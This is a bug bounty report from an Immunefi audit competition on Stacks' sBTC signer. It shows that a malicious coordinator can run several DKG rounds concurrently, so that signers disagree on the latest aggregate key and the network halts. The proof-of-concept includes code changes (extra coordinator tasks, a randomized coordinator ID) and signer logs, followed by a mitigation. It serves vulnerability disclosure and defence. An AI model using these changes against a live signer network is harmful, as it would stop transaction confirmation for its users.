# #38690 \[BC-Insight] A malicious coordinator can run multiple DKG coordination in parallel and manipu

**Submitted on Jan 10th 2025 at 05:54:16 UTC by @ZoA for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38690
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

DKG coordination is the crucial part of the system to generate aggregate key which is used for signing transactions. A coordinator can behave maliciously during their tenure by running multiple DKG coordination process in parallel and manipulate their order, which affects the entire network.

## Vulnerability Details

The signers participate in DKG coordination rounds to share their public/private DKG shares, which at the end constructs an aggregate public key. When the DKG coordination round ends which is at the moment each signer receives `DkgEnd` message, signers store these aggregate keys into the database.

When signers are requested to sign a message, they trust the latest record of the database, thus using the latest aggregate key for signing messages.

So, thinking in the attacker's perspective, how can I break the signers network by letting signers have different perspective of "latest trusted aggregate key"?

To make this happen, one possible solution is for signers to participate in concurrent DKG coordination process which will result in different order of storing aggregate keys into the database. For example, `signer-1` could store aggregate keys in the order of `A, B`, while `signer-2` could store the keys in the order of `B, A` into the database.

Within current implementation of the protocol, it does not include a logic to prevent concurrent DKG coordination or the logic to settle concurrent DKG coordination correctly.

By abusing this implementation, a malicious coordinator can easily break the signers network by coordinating multiple DKG rounds at the same time. When the malicious coordinator distributes `DkgEnd` messages of multiple DKG rounds at the same time, there's high possibility of chances for signers to receive those messages in different order by the nature of the general network system.

## Impact Details

The issue has crucial impact to the system since it will cause disagreements between signers that leads to halt of the entire system. And it's pretty easy for the malicious coordinator to execute this process.

## References

sBTC codebase

## Proof of Concept

## Proof of Concept

The goal of the PoC is to demonstrate the discrepancy between signers regarding order of aggregate keys stored in the database. The PoC is tested on my local machine using provided dev environment with Docker.

To allow the coordinator to execute multiple DKG coordination, here's modified parts of the codebase:

In `signer/src/main.rs`, add more coordinators to simulate concurrent DKG coordination. In PoC, 4 concurrent DKG coordination is used as example.

```diff
    let _ = tokio::join!(
        // Our global termination signal watcher. This does not run using `run_checked`
        // as it sends its own shutdown signal.
        run_shutdown_signal_watcher(context.clone()),
        // The rest of our services which run concurrently, and must all be
        // running for the signer to be operational.
        run_checked(run_api, &context),
        run_checked(run_libp2p_swarm, &context),
        run_checked(run_block_observer, &context),
        run_checked(run_request_decider, &context),
        run_checked(run_transaction_coordinator, &context),
+       run_checked(run_transaction_coordinator, &context),
+       run_checked(run_transaction_coordinator, &context),
+       run_checked(run_transaction_coordinator, &context),
        run_checked(run_transaction_signer, &context),
    );
```

For the coordinator process, `txId` of a DKG round is deterministic based on coordinator's public key and Bitcoin's chain tip. To allow concurrent coordination process, modify `coordinator_id` function in `transaction_coordinator.rs` to include some random information, as follows.

```rust
fn coordinator_id(&self, chain_tip: &model::BitcoinBlockHash) -> [u8; 32] {
    let mut random_bytes = [0u8; 32];
    rand::thread_rng().fill(&mut random_bytes);
    sha2::Sha256::new_with_prefix("SIGNER_COORDINATOR_ID")
        .chain_update(self.pub_key().serialize())
        .chain_update(chain_tip.into_bytes())
        .chain_update(random_bytes)
        .finalize()
        .into()
}
```

And for observation purpose, add a logging in `transaction_signer.rs` when `DkgEnd` is received, modification as follows:

```diff
    if let WstsNetMessage::DkgEnd(DkgEnd { status: DkgStatus::Success, .. }) = outbound {
        self.store_dkg_shares(&txid).await?;
+       tracing::info!("DKG Stored: {}", txid);
    }
```

Finally, to make the test easier, I modified `bootstrap_signatures_required` config in `signer-config.toml` to 3 which means all signers have to sign messages to make it valid.

With these changes, rebuild the signers binary and start the devenv using Docker. After waiting for minutes, there were no on-chain transactions happening as expected, while DKG coordination processes are finished and all signers have aggregate keys in their database.

Here's some proof about the order of DKG coordination of each signer, and the latest aggregate key stored in each database.

**sbtc-signer-1**

```
DKG Stored: 00106c2aa012973d11413851e40ee8bf6d587753d9f2ecbb5ed1f34cd872b86c
DKG Stored: 2af962959bf72bacc9effb23d35ba637d1b768f6679d977e04372c7de4235f8a
DKG Stored: 4a20400982a1911c5fbddf7a0b709fd2f17cec8b00587da1f293f6aa7e977541
DKG Stored: f1e8208b7efb9208e64adcd9a7d24196f58e24dac84caf323eade571c1f17f88
```

```
# SELECT aggregate_key FROM sbtc_signer.dkg_shares ORDER BY created_at DESC LIMIT 1;
\x0350813815fedeaaa96f18607744e43c2ec2d69cf7c64361eeb879be23ee9dfc4c
```

**sbtc-signer-2**

```
DKG Stored: f1e8208b7efb9208e64adcd9a7d24196f58e24dac84caf323eade571c1f17f88
DKG Stored: 4a20400982a1911c5fbddf7a0b709fd2f17cec8b00587da1f293f6aa7e977541
DKG Stored: 00106c2aa012973d11413851e40ee8bf6d587753d9f2ecbb5ed1f34cd872b86c
DKG Stored: 2af962959bf72bacc9effb23d35ba637d1b768f6679d977e04372c7de4235f8a
```

```
SELECT aggregate_key FROM sbtc_signer.dkg_shares ORDER BY created_at DESC LIMIT 1;
\x021c30b509faf2a3c25a846b87ec2f8e0fc36a3e777e8556f048840f0421f13375
```

**sbtc-signer-3**

```
DKG Stored: f1e8208b7efb9208e64adcd9a7d24196f58e24dac84caf323eade571c1f17f88
DKG Stored: 4a20400982a1911c5fbddf7a0b709fd2f17cec8b00587da1f293f6aa7e977541
DKG Stored: 00106c2aa012973d11413851e40ee8bf6d587753d9f2ecbb5ed1f34cd872b86c
DKG Stored: 2af962959bf72bacc9effb23d35ba637d1b768f6679d977e04372c7de4235f8a
```

```
SELECT aggregate_key FROM sbtc_signer.dkg_shares ORDER BY created_at DESC LIMIT 1;
\x021c30b509faf2a3c25a846b87ec2f8e0fc36a3e777e8556f048840f0421f13375
```

As shown in the proof, signers have different order of DKG coordination processed, that results in discrepancy in order of storing keys in database.

Also, here's a screenshot as a proof that shows no transactions happening even after 12 minutes of system up and running.

![sBTC PoC](https://i.ibb.co/Qkzq5d0/sbtc.png)

### Recommended mitigation steps

While `txId` of DKG coordination round is deterministic in perspective of the coordinator, integrity of `txId` is not checked by signers. As a simple mitigation, the signers should validate `txId` based on the coordinator's public key and Bitcoin's chain tip. This way, it can prevent concurrent coordination happening which is the root cause of the issue.
